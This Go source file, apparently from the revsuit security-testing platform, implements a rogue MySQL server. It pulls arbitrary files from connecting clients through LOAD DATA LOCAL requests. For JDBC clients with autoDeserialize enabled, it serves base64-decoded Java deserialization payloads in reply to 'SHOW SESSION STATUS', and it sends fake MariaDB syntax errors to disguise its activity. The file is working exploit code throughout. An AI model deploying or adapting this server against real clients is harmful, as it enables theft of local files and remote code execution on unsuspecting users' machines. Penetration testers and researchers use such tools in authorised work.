package mysql

import (
	"encoding/base64"
	"fmt"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/li4n0/revsuit/internal/database"
	"github.com/li4n0/revsuit/internal/qqwry"
	"github.com/li4n0/revsuit/pkg/mysql/vmysql"
	log "unknwon.dev/clog/v2"
	"vitess.io/vitess/go/sqltypes"
)

var (
	server             *Server
	once               sync.Once
	mysqlConnectorFlag = regexp.MustCompile(`mysql-connector-java(-\d+\.\d+\.\d+)?`)
)

type Server struct {
	Config
	rules     []*Rule
	rulesLock sync.RWMutex

	listener *vmysql.Listener
	Handler  vmysql.Handler

	connRulePool sync.Map
}

func GetServer() *Server {
	once.Do(func() {
		server = &Server{rulesLock: sync.RWMutex{}}
	})
	return server
}

func (s *Server) getRules() []*Rule {
	defer s.rulesLock.RUnlock()
	s.rulesLock.RLock()
	return s.rules
}

func (s *Server) updateRules() error {
	db := database.DB.Model(new(Rule))
	s.rulesLock.Lock()
	db.Order("rank desc").Find(&s.rules)
	s.rulesLock.Unlock()
	return nil
}

// NewConnection is part of the mysql.Handler interface.
func (s *Server) NewConnection(c *vmysql.Conn) {
	log.Trace("New MySQL client from addr [%s] logged in with username [%s], ID [%d]", c.RemoteAddr(), c.User, c.ConnectionID)

	c.RecycleReadPacket()
	var (
		user      = c.User
		schema    = c.SchemaName
		validated bool
	)

	for _, _rule := range s.getRules() {
		flag, _ := _rule.Match(user + schema)
		if flag == "" {
			continue
		}
		s.connRulePool.Store(c.ConnectionID, _rule)
		validated = true
		break
	}
	if !validated {
		c.WriteErrorResponse(vmysql.NewSQLError(vmysql.ERAccessDeniedError, vmysql.SSAccessDeniedError, "Access denied for user '%v'", c.User).Error())
		return
	}
	if c.ConnAttrs != nil {
		if strings.Contains(c.ConnAttrs["_client_name"], "MySQL Connector") {
			c.IsJdbcClient = true
			c.SupportLoadDataLocal = true
			// 测试发现只有 pymysql 和原生命令行会对这个 flag 真正进行修改
			// 而且 Connector/J 默认值为 False, 所以这里做特殊兼容
		}
	}
}

// ConnectionClosed is part of the mysql.Handler interface.
func (s *Server) ConnectionClosed(c *vmysql.Conn) {
	log.Trace("MySQL Client leaved, ID [%d]", c.ConnectionID)
	var (
		user                 = c.User
		clientName           string
		clientOS             string
		supportLoadLocalData = c.SupportLoadDataLocal
		cr, ok               = s.connRulePool.Load(c.ConnectionID)
	)
	if !ok {
		return
	}
	_rule := cr.(*Rule)
	flag, flagGroup := _rule.Match(user)
	if flag == "" {
		log.Error("MySQL Connection rule(%d) not match flag", c.ConnectionID)
	}
	if c.ConnAttrs != nil {
		clientName = c.ConnAttrs["_client_name"] + " " + c.ConnAttrs["_client_version"]
		clientOS = c.ConnAttrs["_os"] + " " + c.ConnAttrs["_platform"]
	}

	ip := strings.Split(c.RemoteAddr().String(), ":")[0]

	filenames := strings.Split(_rule.Files, FILE_SPEARATOR)
	files := make([]File, 0)
	for _, filename := range filenames {
		if len(c.Files[filename]) != 0 {
			files = append(files, File{Name: filename, Content: c.Files[filename]})
		}
	}

	r, err := newRecord(_rule, flag, user, clientName, clientOS, ip, qqwry.Area(ip), supportLoadLocalData, files)
	if err != nil {
		log.Error("MySQL record(rule_id:%s) created failed :%s", _rule.Name, err.Error())
		return
	}
	log.Trace("MySQL record(id:%d) has been created", r.ID)

	//only send to client when this connection recorded first time.
	if _rule.PushToClient {
		if flagGroup != "" {
			var count int64
			database.DB.Where("rule_name=? and domain like ?", _rule.Name, "%"+flagGroup+"%").Model(&Record{}).Count(&count)
			if count <= 1 {
				r.PushToClient()
				log.Trace("MySQL record(id:%d) has been put to client message queue", r.ID)
			}
		} else {
			r.PushToClient()
			log.Trace("MySQL record(id:%d) has been put to client message queue", r.ID)
		}
	}

	//send notice
	if _rule.Notice {
		go func() {
			r.Notice()
			log.Trace("MySQL record(id:%d) notice has been sent", r.ID)
		}()
	}

	s.connRulePool.Delete(c.ConnectionID)
}

// ComQuery is part of the mysql.Handler interface.
func (s *Server) ComQuery(c *vmysql.Conn, query string, callback func(*sqltypes.Result) error) error {
	log.Trace("MySQL Client from addr, ID [%d] try to query [%s]", c.ConnectionID, query)

	// match mysql-connector-java
	if strings.Contains(query, "mysql-connector-java") && (c.ConnAttrs == nil || c.ConnAttrs["_client_name"] == "") {
		c.ConnAttrs = map[string]string{"_client_name": mysqlConnectorFlag.FindString(query)}
	}

	cr, ok := s.connRulePool.Load(c.ConnectionID)
	if !ok {
		c.WriteErrorResponse(
			fmt.Sprintf(
				"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
				strings.ReplaceAll(
					strings.ReplaceAll(query, "%", "%%"),
					"'", "\\'"),
			),
		)
		return nil
	}
	_rule := cr.(*Rule)

	if _rule.ExploitJdbcClient && _rule.Payloads != nil && c.IsJdbcClient {
		if query == "SHOW SESSION STATUS" {
			var payload []byte

			log.Trace("MySQL Client [%d] request `%s`, start exploiting...", c.ConnectionID, query)
			r := &sqltypes.Result{Fields: vmysql.SchemaToFields(vmysql.Schema{
				{Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
				{Name: "Value", Type: sqltypes.Blob, Nullable: false},
			})}

			//choose payload
			//jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true
			if c.ConnAttrs["t"] != "" && _rule.Payloads[c.ConnAttrs["t"]] != "" {
				payload, _ = base64.StdEncoding.DecodeString(_rule.Payloads[c.ConnAttrs["t"]])
			} else {
				for _, v := range _rule.Payloads {
					payload, _ = base64.StdEncoding.DecodeString(v)
					break
				}
			}
			r.Rows = append(r.Rows, vmysql.RowToSQL(vmysql.SQLRow{[]byte{}, payload}))
			_ = callback(r)
		} else {
			r := vmysql.GetMysqlVars()
			_ = callback(r)
		}
		return nil
	}

	// mysql LOAD DATA LOCAL
	if !c.SupportLoadDataLocal { // 客户端不支持读取本地文件且没有开启总是读取，直接返回错误
		log.Trace("MySQL Client not support LOAD DATA LOCAL, return error directly")
		c.WriteErrorResponse(
			fmt.Sprintf(
				"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
				strings.ReplaceAll(
					strings.ReplaceAll(query, "%", "%%"),
					"'", "\\'"),
			),
		)
		return nil
	}

	files := strings.Split(_rule.Files, ";")
	if c.Files == nil {
		c.Files = make(map[string][]byte)
	}
	for _, filename := range files {
		if c.Files[filename] == nil {
			log.Trace("MySQL now try to read file [%s], ID [%d]", filename, c.ConnectionID)
			data := c.RequestFile(filename)
			if data == nil || len(data) == 0 {
				log.Trace("MySQL file [%s] read failed, file may not exist in client [%d]", filename, c.ConnectionID)
				c.Files[filename] = []byte{}
			} else {
				c.Files[filename] = data
			}
			c.WriteErrorResponse(fmt.Sprintf(
				"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
				strings.ReplaceAll(
					strings.ReplaceAll(query, "%", "%%"),
					"'", "\\'"),
			))
		}
	}

	c.WriteErrorResponse(fmt.Sprintf(
		"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1",
		strings.ReplaceAll(
			strings.ReplaceAll(query, "%", "%%"),
			"'", "\\'"),
	))

	return nil
}

// WarningCount is part of the mysql.Handler interface.
func (s *Server) WarningCount(c *vmysql.Conn) uint16 {
	return 0
}

func (s *Server) Run() {
	if err := s.updateRules(); err != nil {
		log.Fatal(err.Error())
	}

	s.Handler = s

	var authServer = &vmysql.AuthServerNone{}
	var err error

	log.Info("Starting Mysql Server at %s", s.Addr)
	s.listener, err = vmysql.NewListener("tcp", s.Addr, authServer, s, s.VersionString, 0, 0)
	if err != nil {
		log.Error("New Mysql Server failed: %s", err)
		os.Exit(-1)
	}

	s.listener.Accept()
}
